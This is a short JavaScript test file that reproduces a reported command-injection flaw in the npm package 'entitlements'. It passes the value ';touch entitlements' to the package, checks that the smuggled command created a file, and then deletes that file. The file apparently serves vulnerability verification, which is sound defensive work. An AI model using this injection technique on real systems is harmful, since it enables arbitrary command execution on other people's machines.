//https://hackerone.com/reports/341869
test("Command Injection in entitlements", () => {
  const entitlements = require("entitlements");
  const fs = require("fs");
  const path = "./entitlements";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  entitlements(";touch entitlements", function (error, data) {});

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
